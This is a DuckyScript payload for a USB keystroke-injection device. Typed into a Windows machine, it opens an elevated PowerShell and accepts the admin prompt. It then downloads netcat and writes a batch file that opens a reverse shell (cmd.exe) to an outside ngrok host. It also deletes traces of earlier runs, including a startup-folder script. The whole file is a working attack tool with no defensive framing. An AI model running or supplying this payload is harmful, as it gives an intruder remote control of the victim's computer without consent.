DUCKY_LANG US
DELAY 2000
DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process powershell -Verb RunAs
ENTER
DELAY 1500
ALT y
DELAY 500
STRING cd $env:TEMP
ENTER
REM --> Kills already running Netcat instance (if any)
STRING TASKKILL /im nc.exe /f
ENTER
REM --> Delete nc.exe file if it already exists
STRING erase /Q nc.exe
ENTER
REM --> Delete Start batch file if it already exists
STRING erase /Q Start.bat
ENTER
REM --> Delete Invisible.vbs in temp folder, if it already exists
STRING erase /Q invisible.vbs
ENTER
REM --> Delete invisible.vbs file in Startup if it already exists
STRING erase /Q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\invisible.vbs"
ENTER
DELAY 500
REM --> Downloads NetCat
STRING $URL="https://dl.packetstormsecurity.net/groups/checksum/nc.exe"; $Path="C:\Users\CYBERUS\Downloads\Programs\nc.exe"; 
STRING Invoke-WebRequest -URL $URL -OutFile $Path
ENTER
DELAY 500
REM --> Creates a batch file to start listening 
STRING copy con Start.bat
ENTER
STRING nc 0.tcp.ap.ngrok.io 10920 -e cmd.exe
ENTER
CONTROL z
ENTER
